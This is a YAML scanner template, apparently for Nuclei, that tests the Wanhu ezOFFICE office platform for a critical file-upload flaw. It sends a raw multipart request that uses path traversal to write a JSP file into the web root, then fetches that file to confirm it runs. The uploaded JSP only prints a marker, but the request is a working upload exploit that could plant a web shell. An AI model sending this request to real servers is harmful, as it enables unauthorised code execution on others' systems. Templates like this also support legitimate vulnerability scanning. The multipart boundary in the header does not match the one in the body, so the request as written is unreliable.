id: wanhuOA-ezoffice-wpsservlet-file-upload

info:
  name: 万户协同办公平台接口存在文件上传漏洞
  author: cnaq 
  severity: critical
  description: 万户协同办公平台接口存在文件上传漏洞
  reference: 
    - https://github.com/wy876/POC/blob/main/%E4%B8%87%E6%88%B7%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  tags: wanhu,OA,file,upload

requests:
  - raw:
      - |
        POST /defaultroot/wpsservlet?option=saveNewFile&newdocld=jsp&dir=../platform/portal/layout/&fileType=.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent:
        Content-Length:266
        Cache-Control:max-age=0
        Content-Type:multipart/form-data;boundary=803e058d60f347f7b3c17fa95228eca6
        Accept-Encoding: gzip,deflate
        Connection:close

        --221e166d60f34112b3c17fa95818ecfe
        Content-Disposition:form-data;name="NewFile";filename="jsptests.jsp"

        <% out.print("jsptests"); %>

        --221e166d60f34112b3c17fa95818ecfe--

      - |
        GET /defaultroot/platform/portal/layout/jsptests.jsp HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - '200'
      - type: regex
        part: body
        regex:
          - 'jsptests'